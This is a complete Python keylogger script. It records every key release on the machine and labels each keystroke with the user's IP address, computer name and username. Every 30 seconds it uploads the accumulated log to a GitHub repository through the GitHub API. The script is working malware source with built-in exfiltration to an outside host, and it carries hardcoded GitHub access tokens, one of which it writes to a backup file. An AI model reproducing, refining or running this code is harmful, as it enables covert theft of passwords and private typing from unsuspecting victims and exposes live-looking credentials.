import keyboard
import os
import sys
import subprocess
import base64
import socket
import getpass
from datetime import datetime
from threading import Timer
import requests
import time
import traceback

class Keylogger:
    def __init__(self):
        self.interval = 30  # Changed to 30 seconds
        self.log = ""
        self.github_repo = "STORAGERKIR/keys"
        self.github_token = "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" 
        
        try:
            print("Initializing keylogger...")
            self.check_dependencies()
            
            # Get system information
            self.username = getpass.getuser()
            self.desktop_name = socket.gethostname()
            self.ip_address = self.get_ip_address()
            self.file_name = f"{self.desktop_name}.txt"
            
            print(f"\n{'='*50}")
            print(f"System Information:")
            print(f"Username: {self.username}")
            print(f"Computer Name: {self.desktop_name}")
            print(f"IP Address: {self.ip_address}")
            print(f"Log File: {self.file_name}")
            print(f"Update Interval: Every {self.interval} seconds")
            print(f"{'='*50}\n")
            
            # Start the keylogger
            self.start()
            
        except Exception as e:
            print(f"\n[ERROR] Initialization failed: {str(e)}")
            traceback.print_exc()
            input("\nPress Enter to exit...")
            sys.exit(1)

    def get_ip_address(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown-ip"

    def check_dependencies(self):
        required = ['keyboard', 'requests']
        missing = []
        for package in required:
            try:
                __import__(package)
            except ImportError:
                missing.append(package)
        
        if missing:
            print(f"Missing packages: {', '.join(missing)}")
            choice = input("Install automatically? (y/n): ").lower()
            if choice == 'y':
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
                    print("Dependencies installed successfully!")
                    time.sleep(2)
                except Exception as e:
                    print(f"Installation failed: {e}")
                    sys.exit(1)
            else:
                print("Exiting...")
                sys.exit(1)

    def callback(self, event):
        name = event.name
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        
        self.log += f"{name} --- ({self.ip_address})/{self.desktop_name}/{self.username}/{timestamp}\n"

    def update_github(self):
        try:
            url = f"https://api.github.com/repos/{self.github_repo}/contents/{self.file_name}"
            headers = {
                "Authorization": f"token {self.github_token}",
                "Accept": "application/vnd.github.v3+json"
            }
            
            # Check if file exists
            response = requests.get(url, headers=headers)
            current_content = ""
            sha = None
            
            if response.status_code == 200:
                sha = response.json().get('sha')
                current_content = base64.b64decode(response.json()['content']).decode('utf-8')
                print(f"[+] Updating existing file: {self.file_name}")
            elif response.status_code == 404:
                print(f"[+] Creating new file: {self.file_name}")
            else:
                print(f"[!] GitHub API Error: {response.status_code}")
                return False
            
            # Prepare content
            updated_content = current_content + self.log
            content_encoded = base64.b64encode(updated_content.encode('utf-8')).decode('utf-8')
            
            data = {
                "message": f"Update from {self.desktop_name} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "content": content_encoded,
                "sha": sha
            }
            
            response = requests.put(url, headers=headers, json=data)
            if response.status_code in [200, 201]:
                print(f"[+] Successfully updated {self.file_name}")
                return True
            else:
                print(f"[!] Upload failed: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            print(f"[!] Connection error: {str(e)}")
            return False

    def report(self):
        if self.log:
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Preparing update...")
            
            if self.update_github():
                self.log = ""
            else:
                print("[!] Will retry in 30 seconds...")
                time.sleep(30)
                return self.report()
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        print(f"\n{'='*50}")
        print(f"Keylogger initialized at {datetime.now()}")
        print(f"Updates every {self.interval} seconds")
        print("Press ESC to terminate")
        print(f"{'='*50}\n")
        
        keyboard.on_release(callback=self.callback)
        self.report()
        
        # Keep the program running
        try:
            keyboard.wait('esc')
        except KeyboardInterrupt:
            pass
            
        print(f"\n{'='*50}")
        print("Session terminated")
        print(f"Final update at {datetime.now()}")
        print(f"{'='*50}")
        input("Press Enter to close this window...")

if __name__ == "__main__":
    # Verify token exists
    if not os.path.exists("token_backup.txt"):
        with open("token_backup.txt", "w") as f:
            f.write("# Backup of your GitHub token\n")
            f.write("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")
    
    Keylogger()  # Start the keylogger
